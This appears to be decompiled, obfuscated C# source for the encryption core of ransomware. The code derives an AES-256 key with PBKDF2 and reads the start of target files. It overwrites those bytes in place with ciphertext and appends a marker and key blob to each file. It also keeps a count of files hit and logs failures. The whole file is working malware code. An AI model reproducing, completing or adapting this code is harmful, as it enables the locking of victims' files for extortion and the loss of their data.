using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace xNvWsvlcqg;

public static class RAmhBpyRiGl
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] unFayKpwdprxCd(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = xPzXBYbBQCDeRK(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes xPzXBYbBQCDeRK(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] TgumgxJZfkLWfK(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (BhIlEyPUpxxiJj.IFvLMpzOSPyqWOA == getString_0(107396882))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (BhIlEyPUpxxiJj.FGwDVtbcOC)
			{
				try
				{
					File.AppendAllText(BhIlEyPUpxxiJj.INeStFPWBkZD, getString_0(107354494) + string_0 + getString_0(107365867) + ex.Message + getString_0(107396468));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool ZLmXIWIpBjEjEn(string jjIOhBEBnCjm, byte[] jnCeIRxEySWxu, byte[] EAVZnaPdus = null)
	{
		try
		{
			byte[] array = null;
			if (BhIlEyPUpxxiJj.IFvLMpzOSPyqWOA == getString_0(107396882))
			{
				array = (BhIlEyPUpxxiJj.KFBSzlIThq ? Encoding.ASCII.GetBytes(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(BhIlEyPUpxxiJj.pgpcIPotHLWycdV) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365297)) + Convert.ToString(BhIlEyPUpxxiJj.goioCyqGfap) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365297))) : Encoding.ASCII.GetBytes(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(BhIlEyPUpxxiJj.pgpcIPotHLWycdV) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365274)) + Convert.ToString(BhIlEyPUpxxiJj.goioCyqGfap) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365274))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(jjIOhBEBnCjm, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(jnCeIRxEySWxu, 0, jnCeIRxEySWxu.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(jjIOhBEBnCjm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!BhIlEyPUpxxiJj.KFBSzlIThq)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(EAVZnaPdus, 0, EAVZnaPdus.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (BhIlEyPUpxxiJj.KFBSzlIThq ? Encoding.ASCII.GetBytes(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(BhIlEyPUpxxiJj.pgpcIPotHLWycdV) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365297)) + Convert.ToString(BhIlEyPUpxxiJj.goioCyqGfap) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365297))) : Encoding.ASCII.GetBytes(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(BhIlEyPUpxxiJj.pgpcIPotHLWycdV) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365274)) + Convert.ToString(BhIlEyPUpxxiJj.goioCyqGfap) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365274))));
				FileStream fileStream2 = new FileStream(jjIOhBEBnCjm, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(jnCeIRxEySWxu, 0, jnCeIRxEySWxu.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(jjIOhBEBnCjm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!BhIlEyPUpxxiJj.KFBSzlIThq)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(EAVZnaPdus, 0, EAVZnaPdus.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			BhIlEyPUpxxiJj.TQvWczwJmWtVsb++;
		}
		catch (Exception ex)
		{
			if (BhIlEyPUpxxiJj.FGwDVtbcOC)
			{
				try
				{
					File.AppendAllText(BhIlEyPUpxxiJj.INeStFPWBkZD, getString_0(107354494) + jjIOhBEBnCjm + getString_0(107365288) + ex.Message + getString_0(107396468));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (BhIlEyPUpxxiJj.KFBSzlIThq ? Encoding.ASCII.GetBytes(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(BhIlEyPUpxxiJj.pgpcIPotHLWycdV) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365297)) + Convert.ToString(BhIlEyPUpxxiJj.goioCyqGfap) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365297))) : Encoding.ASCII.GetBytes(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(BhIlEyPUpxxiJj.pgpcIPotHLWycdV) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365274)) + Convert.ToString(BhIlEyPUpxxiJj.goioCyqGfap) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365274))));
			FileStream fileStream4 = new FileStream(jjIOhBEBnCjm, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(jnCeIRxEySWxu, 0, jnCeIRxEySWxu.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using (FileStream fileStream5 = new FileStream(jjIOhBEBnCjm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
			{
				if (!BhIlEyPUpxxiJj.KFBSzlIThq)
				{
					fileStream5.Write(array2, 0, array2.Length);
				}
				else
				{
					fileStream5.Write(EAVZnaPdus, 0, EAVZnaPdus.Length);
					fileStream5.Write(array2, 0, array2.Length);
				}
			}
			return false;
		}
		return true;
	}

	static RAmhBpyRiGl()
	{
		Strings.CreateGetStringDelegate(typeof(RAmhBpyRiGl));
	}
}
